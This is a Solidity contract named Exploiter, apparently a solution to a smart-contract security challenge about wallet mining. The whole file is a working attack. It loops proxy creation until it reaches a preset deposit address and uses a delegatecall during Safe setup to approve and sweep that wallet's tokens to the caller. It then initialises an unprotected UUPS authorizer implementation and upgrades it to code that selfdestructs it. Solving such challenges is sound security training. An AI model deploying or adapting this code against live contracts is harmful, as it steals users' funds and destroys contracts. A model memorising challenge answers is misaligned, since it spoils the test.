// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AuthorizerUpgradeable.sol";
import "./WalletDeployer.sol";

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

contract Exploiter is UUPSUpgradeable {
    address private constant GNOSIS_SAFE_PROXY_FACTORY = 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B;
    address private constant GNOSIS_SAFE = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
    address private constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;

    AuthorizerUpgradeable private immutable authorizerImplementation;
    WalletDeployer private immutable walletDeployer;
    address immutable ward;
    IERC20 immutable token;

    constructor(address _authorizerImplementationAddress, address _walletDeployerAddress, address _ward) {
        authorizerImplementation = AuthorizerUpgradeable(_authorizerImplementationAddress);
        walletDeployer = WalletDeployer(_walletDeployerAddress);
        ward = _ward;
        token = IERC20(walletDeployer.gem());
    }

    function attack() external {
        // find the depositor address
        address depositor;
        while (depositor != DEPOSIT_ADDRESS) {
            depositor = IGnosisSafeProxyFactory(GNOSIS_SAFE_PROXY_FACTORY).createProxy(GNOSIS_SAFE, "");
        }

        // do the same as level 11 to sweep tokens from newly created wallet (the only difference is the use of setup directly instead of createProxyWithCallback)
        address[] memory _owners = new address[](1);
        _owners[0] = ward;
        bytes memory callbackData = abi.encodeWithSelector(IERC20.approve.selector, address(this), type(uint256).max);
        bytes memory delegateCallData = abi.encodeWithSelector(this.callback.selector, callbackData);
        bytes memory data = abi.encodeWithSelector(
            IGnosisSafe(depositor).setup.selector,
            _owners, // _owners List of Safe owners.
            1, // _threshold Number of required confirmations for a Safe transaction.
            address(this), // to Contract address for optional delegate call.
            delegateCallData, // data Data payload for optional delegate call.
            address(0), // fallbackHandler Handler for fallback calls to this contract
            address(0), // paymentToken Token that should be used for the payment (0 is ETH)
            0, // payment Value that should be paid
            address(0) // paymentReceiver Address that should receive the payment (or 0 if tx.origin)
        );
        depositor.call(data);

        token.transferFrom(address(depositor), msg.sender, token.balanceOf(address(depositor)));

        // attack the authorizerUpgradeable contract
        address[] memory wards = new address[](0);
        address[] memory aims = new address[](0);
        authorizerImplementation.init(wards, aims);

        bytes memory authDelegateCallData = abi.encodeWithSelector(this.authCallback.selector);
        authorizerImplementation.upgradeToAndCall(address(this), authDelegateCallData);
    }

    function callback(bytes calldata data) external {
        address(token).call(data);
    }

    function authCallback() external {
        selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address imp) internal override {}
}
